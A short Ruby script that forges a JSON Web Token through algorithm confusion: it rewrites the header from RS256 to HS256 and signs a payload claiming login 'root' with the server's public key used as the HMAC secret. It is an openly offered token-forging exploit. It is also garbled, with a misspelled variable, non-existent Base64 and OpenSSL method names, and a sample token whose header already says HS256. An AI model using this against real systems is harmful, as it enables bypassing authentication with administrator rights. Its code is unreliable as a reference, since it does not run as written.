require 'base64'
require 'openssl'

pub = File.open("/path/to/public/key").read

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InJvb3QiLCJpYXQiOiIxNDk3NDg4Nzk5In0.ZDE4ZGVmODM0YWU5ZGQ2NzMzNjg3YjE4OTE3YmU0NzA5ZmVjMTk5N2JhNzIxZmU0MzkwYzk4OTZiMTYxYzcwMQ"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
puts decoded_header
new_heder = Base64.encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload)
puts decoded_payload
new_payload = Base64.encoded64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encoded64(OpenSSL::HMAC.digest(OpenSSL::DIGEST.new("sha256"), pub ,data))

puts data+"."+signature
